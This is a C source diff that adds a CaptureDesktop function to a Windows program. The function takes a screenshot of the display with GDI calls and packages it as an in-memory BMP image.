@@ -1132,3 +1132,101 @@ VOID FreeAllocatedHeap
 		HeapFree(GetProcessHeap(), 0, lpBuffer);
 	}
 }
+
+PBUFFER CaptureDesktop
+(
+	_In_ HWND hWnd
+)
+{
+	HDC hDC = NULL;
+	HDC hMemDC = NULL;
+	BITMAP ScreenBitmap;
+	HBITMAP hBitmap = NULL;
+	BITMAPFILEHEADER BmpFileHdr;
+	BITMAPINFOHEADER BmpInfoHdr;
+	DWORD dwBmpSize = 0;
+	PBUFFER pResult = NULL;
+	PBYTE pBitmapBuffer = NULL;
+	DWORD cbDIB = 0;
+	DWORD dwScreenWidth = 0;
+	DWORD dwScreenHeight = 0;
+
+	SecureZeroMemory(&ScreenBitmap, sizeof(ScreenBitmap));
+	SecureZeroMemory(&BmpFileHdr, sizeof(BmpFileHdr));
+	SecureZeroMemory(&BmpInfoHdr, sizeof(BmpInfoHdr));
+	hDC = GetDC(hWnd);
+	if (hDC == NULL) {
+		LOG_ERROR("GetDC", GetLastError());
+		goto CLEANUP;
+	}
+
+	hMemDC = CreateCompatibleDC(hDC);
+	if (hMemDC == NULL) {
+		LOG_ERROR("CreateCompatibleDC", GetLastError());
+		goto CLEANUP;
+	}
+
+	/*SecureZeroMemory(&ClientRect, sizeof(ClientRect));
+	if (!GetClientRect(hWnd, &ClientRect)) {
+		LOG_ERROR("GetClientRect", GetLastError());
+		goto CLEANUP;
+	}*/
+
+	dwScreenWidth = GetDeviceCaps(hDC, HORZRES);
+	dwScreenHeight = GetDeviceCaps(hDC, VERTRES);
+	hBitmap = CreateCompatibleBitmap(hDC, dwScreenWidth, dwScreenHeight);
+	if (hBitmap == NULL) {
+		LOG_ERROR("CreateCompatibleBitmap", GetLastError());
+		goto CLEANUP;
+	}
+
+	SelectObject(hMemDC, hBitmap);
+	if (!BitBlt(hMemDC, 0, 0, dwScreenWidth, dwScreenHeight, hDC, 0, 0, SRCCOPY)) {
+		LOG_ERROR("BitBlt", GetLastError());
+		goto CLEANUP;
+	}
+
+	GetObjectW(hBitmap, sizeof(BITMAP), &ScreenBitmap);
+	BmpInfoHdr.biSize = sizeof(BITMAPINFOHEADER);
+	BmpInfoHdr.biWidth = ScreenBitmap.bmWidth;
+	BmpInfoHdr.biHeight = ScreenBitmap.bmHeight;
+	BmpInfoHdr.biPlanes = 1;
+	BmpInfoHdr.biBitCount = 32;
+	BmpInfoHdr.biCompression = BI_RGB;
+	BmpInfoHdr.biSizeImage = 0;
+	BmpInfoHdr.biXPelsPerMeter = 0;
+	BmpInfoHdr.biYPelsPerMeter = 0;
+	BmpInfoHdr.biClrUsed = 0;
+	BmpInfoHdr.biClrImportant = 0;
+	dwBmpSize = ((ScreenBitmap.bmWidth * BmpInfoHdr.biBitCount + 31) / 32) * 4 * ScreenBitmap.bmHeight;
+	pBitmapBuffer = ALLOC(dwBmpSize);
+	if (GetDIBits(hDC, hBitmap, 0, ScreenBitmap.bmHeight, pBitmapBuffer, (PBITMAPINFO)&BmpInfoHdr, DIB_RGB_COLORS) == 0) {
+		LOG_ERROR("GetDIBits", GetLastError());
+		goto CLEANUP;
+	}
+
+	cbDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+	BmpFileHdr.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+	BmpFileHdr.bfSize = cbDIB;
+	BmpFileHdr.bfType = 0x4D42;
+
+	pResult = BufferEmpty(sizeof(BmpFileHdr) + sizeof(BmpInfoHdr) + dwBmpSize);
+	memcpy(pResult->pBuffer, &BmpFileHdr, sizeof(BmpFileHdr));
+	memcpy(&pResult->pBuffer[sizeof(BmpFileHdr)], &BmpInfoHdr, sizeof(BmpInfoHdr));
+	memcpy(&pResult->pBuffer[sizeof(BmpFileHdr) + sizeof(BmpInfoHdr)], pBitmapBuffer, dwBmpSize);
+CLEANUP:
+	FREE(pBitmapBuffer);
+	if (hBitmap != NULL) {
+		DeleteObject(hBitmap);
+	}
+
+	if (hMemDC != NULL) {
+		DeleteDC(hMemDC);
+	}
+
+	if (hDC != NULL) {
+		ReleaseDC(hWnd, hDC);
+	}
+
+	return pResult;
+}
